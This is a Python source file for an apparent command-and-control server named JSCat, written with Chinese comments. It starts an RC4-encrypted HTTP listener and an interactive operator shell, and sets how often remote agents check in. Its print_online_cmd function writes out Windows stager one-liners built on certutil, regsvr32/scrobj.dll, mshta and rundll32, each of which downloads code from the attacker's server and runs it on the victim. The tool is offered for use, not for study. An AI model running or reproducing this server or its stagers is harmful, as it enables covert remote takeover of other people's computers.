#!/usr/bin/env python3
# coding:utf-8
import os
import random
import string
import argparse
from lib.shell import Shell
from lib.session import Session
from lib.server import Server
from lib.handler import JSCatServer
from lib.color import BOLD


'''
上线方式
'''


def print_online_cmd(host, port):
    print('[*]Execute in client:')
    print('{} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
    print('{} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
    print('''{} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format(BOLD('mshta'), host, port))
    print('{} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'.format(BOLD('rundll32'), host, port))


'''
RC4加密的key
'''


def get_rc4_key(new_key):
    RC4_KEY_FILE = 'rc4_key.txt'
    if not new_key and os.path.exists(RC4_KEY_FILE):
        with open(RC4_KEY_FILE) as f1:
            key = f1.readline().strip()
        if len(key) > 0:
            return key
    key = ''.join([random.choice(string.ascii_letters) for i in range(16)])
    with open(RC4_KEY_FILE, 'w') as f2:
        f2.write(key)

    return key


def run(ip, port, new_key, sleep_time):
    # 获取当前使用的rc4加密key
    rc4_key = get_rc4_key(new_key)
    print('[*]server encrypt key is {}'.format(BOLD(rc4_key)))
    # 启动http监听服务
    session = Session()
    shell = Shell(session)
    httpd = Server(ip, port, JSCatServer, session, shell, rc4_key, sleep_time)
    httpd.start()
    print('[*]server running in {}:{}...'.format(BOLD(ip), BOLD(port)))
    print_online_cmd(ip, port)
    # 控制台命令输入
    try:
        while True:
            if not httpd.shell.get_command():
                httpd.shutdown()
                exit()
    except KeyboardInterrupt:
        httpd.shutdown()
        print('server shutdown')


def print_banner():
    banner = '''                                                   
      _    ___     ___             _     
   _ | |  / __|   / __|   __ _    | |_   
  | || |  \__ \  | (__   / _` |   |  _|  
  _\__/   |___/   \___|  \__,_|   _\__|  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
    '''
    print(banner)

def main():
    print_banner()

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True,
                        help='host listening ip ,default is 0.0.0.0')
    parser.add_argument('-p', '--port', default=6600,
                        help='host listening port,default is 6600')
    parser.add_argument('--new_key', default=False, action="store_true",
                        help="generate new rc4 key to encrypt data")
    parser.add_argument('-s', '--sleep_time', default=5,
                        help='set agent sleep time in second,default is 5')
    args = parser.parse_args()

    run(args.host, int(args.port), args.new_key, args.sleep_time)


if __name__ == '__main__':
    main()
